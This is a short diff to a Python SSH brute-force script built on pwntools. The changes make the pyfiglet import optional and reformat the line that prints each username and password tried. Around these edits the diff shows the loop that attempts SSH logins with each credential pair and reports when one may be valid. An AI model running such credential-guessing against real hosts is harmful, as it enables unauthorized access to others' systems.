@@ -1,6 +1,10 @@
 #!/usr/bin/env python
 
-import argparse;from pwn import *;import paramiko;import time;import pyfiglet
+import argparse;from pwn import *;import paramiko;import time
+try:
+	import pyfiglet
+except:
+	print("Failed to detect pyfiglet.\n")
 usr_arr=[];pass_arr=[]
 
 
@@ -43,7 +47,7 @@ print(banner)
 i=1;x=0;u=0
 while i==1:
 	try:
-		print("User:",usr_arr[u],"\nPassword: ",pass_arr[x])
+		print "User:",str(usr_arr[u]),"| Password:",str(pass_arr[x])
 		sh=ssh(usr_arr[u], host, password=pass_arr[x], port=args.port)
 		print("May have found valid credentials.\n")
 		break
